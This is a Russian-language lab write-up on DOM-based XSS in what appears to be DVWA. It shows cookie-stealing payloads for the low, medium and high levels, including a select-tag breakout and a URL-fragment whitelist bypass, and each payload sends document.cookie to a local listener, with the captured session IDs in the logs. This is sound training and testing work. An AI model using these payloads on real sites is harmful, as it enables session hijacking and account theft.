Тут уже становится интерсно. Мы не сможем использовать **dalfox**, он не может зарегистрировать  **DOM XSS** таким же образом как отраженную. 

Но для **DOM XSS** payloadа нет, сервер вернет обычную страницу. Будем делать руками

### LOW
Давайте немного усложним себе задачу, будем формировать такой payload что бы куки отправлялись на наш веб сервер. Сюда подойдет такой скрипт
```html
<script>window.location='http://127.0.0.1:9090/?cookie=' + document.cookie</script>
```
#### Уязвимый код 
```php
<?php

# No protections, anything goes

?>
```
Без комментариев... Напрямую обращаемся в DOM.

В терминале запустим веб сервер на порту 9090, тот же порт что и в скрипте.
```sh
└─$ python -m http.server 9090
Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...
```

И так как параметр передается в URL мы можем вставить его прямо туда.
- http://127.0.0.1:42001/vulnerabilities/xss_d/?default=<script>window.location='http://127.0.0.1:9090/?cookie=' + document.cookie</script>

И получим наши куки. Если бы это была хранимая XSS, мы бы крали куки всех пользователей загрузивших эту страницу.
```sh
127.0.0.1 - - [25/Feb/2026 23:44:37] "GET /?cookie=language=en;%20cookieconsent_status=dismiss;%20welcomebanner_status=dismiss;%20security=low;%20PHPSESSID=48bd535863ab49a9e2f91bd12add6b03 HTTP/1.1" 200 -
```

### MEDIUM
Это код страницы, видим тег `<select`, если мы из него выйдем то сможем прокинуть скрипт на страницу:
```html
<select name="default"> <script> if (document.location.href.indexOf("default=") >= 0) { var lang = document.location.href.substring(document.location.href.indexOf("default=")+8); document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>"); document.write("<option value='' disabled='disabled'>----</option>"); } document.write("<option value='English'>English</option>"); document.write("<option value='French'>French</option>"); document.write("<option value='Spanish'>Spanish</option>"); document.write("<option value='German'>German</option>");
```

Вставляем в URL:
```html
</select><svg/onload=window.location='http://127.0.0.1:8080/?cookie='+document.cookie>
```

И получаем наши куки:
```sh
127.0.0.1 - - [25/Feb/2026 23:53:28] "GET /?cookie=language=en;%20cookieconsent_status=dismiss;%20welcomebanner_status=dismiss;%20security=medium;%20PHPSESSID=48bd535863ab49a9e2f91bd12add6b03 HTTP/1.1" 200 -
```
#### Уязвимый код
```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
	$default = $_GET['default'];
	
	# Do not allow script tags
	if (stripos ($default, "<script") !== false) {
		header ("location: ?default=English");
		exit;
	}
}

?>
```

Тут уже есть защита, но все еще слабая, опять слабый лист фильтрации.

### HIGH
На этом уровне уже установлен WAF, как я понимаю с белым списком того, что можно пускать а что нет. Но это довольно легко обойти, если использновать знак #. Все что будет после него не будет оправляться на сервер, но будет сохраняться в браузере.

Весь URL запрос будет выглядить вот так:
```URL
 127.0.0.1:42001/vulnerabilities/xss_d#default=<script>window.location='http://127.0.0.1:8080/?cookie=' + document.cookie</script>
```

Получаем наши куки:
```sh
127.0.0.1 - - [25/Feb/2026 23:58:45] "GET /?cookie=language=en;%20cookieconsent_status=dismiss;%20welcomebanner_status=dismiss;%20security=high;%20PHPSESSID=48bd535863ab49a9e2f91bd12add6b03 HTTP/1.1" 200 -
```

#### Уязвимый код
```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {

	# White list the allowable languages
	switch ($_GET['default']) {
		case "French":
		case "English":
		case "German":
		case "Spanish":
			# ok
			break;
		default:
			header ("location: ?default=English");
			exit;
	}
}

?>
```

Здесь используется уже белый список, но защита все еще проседает.